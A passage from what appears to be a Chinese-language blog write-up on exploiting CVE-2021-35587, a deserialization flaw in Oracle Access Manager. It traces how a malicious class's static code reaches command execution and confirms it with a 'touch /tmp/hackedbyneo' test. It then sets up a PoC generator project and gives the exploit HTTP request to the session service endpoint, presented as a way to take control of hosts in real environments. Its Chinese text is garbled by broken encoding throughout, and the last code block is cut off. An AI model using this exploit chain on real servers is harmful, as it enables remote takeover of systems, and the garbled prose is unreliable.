alt=image-20220630231117661></p><p>å¤šæ–¹æŠ˜è…¾ä¹‹åï¼Œç»ˆäºæ¥å—äº†æœåŠ¡ç«¯æ‰¾ä¸åˆ°Remotableè¿™ä¸ªäº‹å®ã€‚æˆ‘æ²‰æ€è‰¯ä¹…ï¼Œç»ˆäºé—®å‡ºé‚£ä¸ªé—®é¢˜â€”â€”<strong>é‚£ä¹ˆç©¶ç«Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ååºåˆ—åŒ–è‡ªå·±çš„testç±»å´è¦å»æ‰¾Remotableç±»å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆå°±æ˜¯ï¼šå› ä¸ºæˆ‘çš„test6å®šä¹‰é‡Œé¢å®ç°äº†è¿™ä¸ªæ¥å£ã€‚</p><p><img loading=lazy src=image-20220630231359837.png alt=image-20220630231359837></p><p>æˆ‘ä¸ºä»€ä¹ˆå®ç°è¿™ä¸ªæ¥å£å‘¢ï¼Ÿå› ä¸ºåœ¨åˆ©ç”¨CVE-2020-14644çš„æ—¶å€™å¿…é¡»å®ç°è¿™ä¸ªæ¥å£ã€‚é‚£ä¹ˆç°åœ¨å‘¢ï¼Ÿä¸å®ç°å¯ä»¥å—ï¼Ÿ</p><p>é‡æ–°å°è¯•ä½¿ç”¨ä¸€ä¸ªä¸å®ç°Remotableæ¥å£çš„test6ç±»è¿›è¡Œè°ƒè¯•ï¼Œå‚è€ƒè°ƒç”¨æ ˆæ·»åŠ ä¸€ä¸ªæ–­ç‚¹com.tangosol.internal.util.invoke.RemoteConstructor#readResolveã€‚</p><p>ä¸€è·¯è·Ÿè¿›åå°„æ¥åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼š</p><p><img loading=lazy src=image-20220630233258313.png alt=image-20220630233258313></p><p>è™½ç„¶ä¸çŸ¥é“è‡ªå·±åœ¨å“ªé‡Œï¼Œä½†æ˜¯çœ‹åˆ°äº†calc å’Œ touchï¼Œè¯´æ˜é™æ€ä»£ç è¢«æ‰§è¡Œäº†ã€‚</p><p><img loading=lazy src=image-20220630233508611.png alt=image-20220630233508611></p><p>ä»pers.neo.test6æ‰§è¡Œåˆ°äº†getRuntime</p><p><img loading=lazy src=image-20220630233610066.png alt=image-20220630233610066></p><p>æ‰§è¡Œåˆ°äº†exec</p><p><img loading=lazy src=image-20220630233931894.png alt=image-20220630233931894></p><p>åˆ‡å‰² token</p><p><img loading=lazy src=image-20220630234134359.png alt=image-20220630234134359></p><p>ä¸€è·¯è·Ÿè¿›execç›´åˆ°java.lang.UNIXProcess</p><p><img loading=lazy src=image-20220630234644938.png alt=image-20220630234644938></p><p>ç„¶åæ‰§è¡Œçš„nativeçš„forkAndExec</p><p><img loading=lazy src=image-20220630234819779.png alt=image-20220630234819779></p><p><img loading=lazy src=image-20220630235030429.png alt=image-20220630235030429></p><p>æ”¹å˜test6ä¸­çš„å‘½ä»¤ä¸º <code>touch /tmp/hackedbyneo</code>ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼š</p><p><img loading=lazy src=image-20220630235334364.png alt=image-20220630235334364></p><p>å°±æ˜¯è¯´å»æ‰ implements Remotableå°±å¯ä»¥äº†ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯ClusterMasterRemoteä¹Ÿä¸ç”¨å®ç°ã€‚ç¡®å®å¦‚æ­¤ã€‚</p><p><img loading=lazy src=image-20220630235900537.png alt=image-20220630235900537></p><p><img loading=lazy src=image-20220630235839635.png alt=image-20220630235839635></p><p>å…¶å®ï¼ŒSerializableæ¥å£ä¹Ÿä¸éœ€è¦ã€‚</p><h3 id=from-cve-2020-14644-to-cve-2021-35587>From CVE-2020-14644 to CVE-2021-35587<a hidden class=anchor aria-hidden=true href=#from-cve-2020-14644-to-cve-2021-35587>#</a></h3><p>æ€»çš„æ¥è¯´ï¼Œå°†è‡ªå®šä¹‰çš„æ¶æ„ç±»ä»</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-88-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-88-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>public class test7 implements Remotable, ClusterMasterRemote, Serializable {}
</span></span></code></pre></td></tr></table></div></div><p>æ”¹ä¸º</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-89-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-89-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>public class test7 implements Serializable {}
</span></span></code></pre></td></tr></table></div></div><p>å°±è§£å†³äº†æœ€åçš„éšœç¢ã€‚</p><p>å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œå› ä¸ºRemotableæ²¡æœ‰æ‰¾åˆ°è€Œè¿Ÿè¿Ÿæ— æ³•æˆåŠŸåˆ©ç”¨æ¼æ´ã€‚å·®ä¹‹æ¯«å˜ï¼Œè°¬ä¹‹åƒé‡Œï¼Œæ­£æ˜¯æ­¤æ„ã€‚</p><p>è‡³æ­¤æˆ‘ä»¬å°±å®Œæˆäº†åˆ©ç”¨CVE-2021-35587è¿™ä¸ªæ¼æ´ä»ååºåˆ—åŒ–å…¥å£åˆ°æ¶æ„ç±»é™æ€ä»£ç æ‰§è¡Œçš„å…¨è¿‡ç¨‹ã€‚</p><p>ä¸‹é¢çœ‹ä¸€ä¸‹å¦‚ä½•åœ¨çœŸå®ç¯å¢ƒä¸­é‡‡ç”¨å„ç§å§¿åŠ¿åˆ©ç”¨è¿™ä¸ªæ¼æ´è·å–ä¸»æœºæ§åˆ¶æƒé™ã€‚</p><h1 id=æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨<a hidden class=anchor aria-hidden=true href=#æ¼æ´åˆ©ç”¨>#</a></h1><h2 id=æ–°å»ºç”Ÿæˆpocçš„å·¥ç¨‹>æ–°å»ºç”ŸæˆPoCçš„å·¥ç¨‹<a hidden class=anchor aria-hidden=true href=#æ–°å»ºç”Ÿæˆpocçš„å·¥ç¨‹>#</a></h2><p>åœ¨ideaä¸­æ–°å»ºä¸€ä¸ªåä¸ºwlsgadgetçš„mavenå·¥ç¨‹ã€‚</p><p>ä¸ºäº†æ“ä½œå­—èŠ‚ç ï¼Œåœ¨pom.xmlä¸­æ·»åŠ javassistã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-90-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-90-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;project</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://maven.apache.org/POM/4.0.0&#34;</span>
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>xmlns:xsi=</span><span style=color:#e6db74>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style=display:flex><span>         <span style=color:#a6e22e>xsi:schemaLocation=</span><span style=color:#e6db74>&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;modelVersion&gt;</span>4.0.0<span style=color:#f92672>&lt;/modelVersion&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;groupId&gt;</span>org.example<span style=color:#f92672>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;artifactId&gt;</span>wlsgadget<span style=color:#f92672>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;version&gt;</span>1.0-SNAPSHOT<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;dependencies&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;dependency&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;groupId&gt;</span>org.javassist<span style=color:#f92672>&lt;/groupId&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;artifactId&gt;</span>javassist<span style=color:#f92672>&lt;/artifactId&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;version&gt;</span>3.20.0-GA<span style=color:#f92672>&lt;/version&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/dependency&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/dependencies&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/project&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸ºäº†é¡ºåˆ©ç”ŸæˆPoCï¼Œè¿˜éœ€è¦åœ¨libraryä¸­æ·»åŠ  â€è¿œç¨‹è°ƒè¯•OAM -> â‘¤ä¸‹è½½ä¾èµ–åŒ…åˆ°è°ƒè¯•ä¸»æœºâ€œ ä¸­æåˆ°çš„oraclelibã€wlfullclientã€coherencelibä¸‰ä¸ªä¾èµ–ã€‚</p><h2 id=genpocjavaæ¼æ´åˆ©ç”¨æ¡†æ¶>genpoc.javaï¼šæ¼æ´åˆ©ç”¨æ¡†æ¶<a hidden class=anchor aria-hidden=true href=#genpocjavaæ¼æ´åˆ©ç”¨æ¡†æ¶>#</a></h2><p>genpoc.javaç”¨basicServiceContextçš„å¯¹è±¡åŒ…è£¹ä¸€æ¡å·²çŸ¥çš„weblogicåˆ©ç”¨é“¾ï¼ˆCVE-2021-14644ï¼‰ã€‚</p><p>cve_2021_35587()æ–¹æ³•çš„è¾“å…¥æ˜¯ä¸€ä¸ªæˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»ï¼Œå¦‚rev.classï¼Œè¾“å‡ºæ˜¯å¯ä»¥ç”¨äºè§¦å‘æ¼æ´çš„requesterå‚æ•°å€¼ï¼Œå³ä»¥ä¸‹è¯·æ±‚æŠ¥æ–‡ä¸­çš„xxxxéƒ¨åˆ†ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 289
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>å…¶ä¸­ä½œä¸ºå‚æ•°ä¼ å…¥cve_2021_35587()æ–¹æ³•çš„ç±»å³ç”¨äºåœ¨ååºåˆ—åŒ–çš„æœ€ç»ˆç¯èŠ‚æ„å»ºæ¶æ„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨è¯¸å¦‚rev.classè¿™æ ·çš„æ¶æ„ç±»çš„æ„é€ å‡½æ•°ä¸­æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-33>33</a>
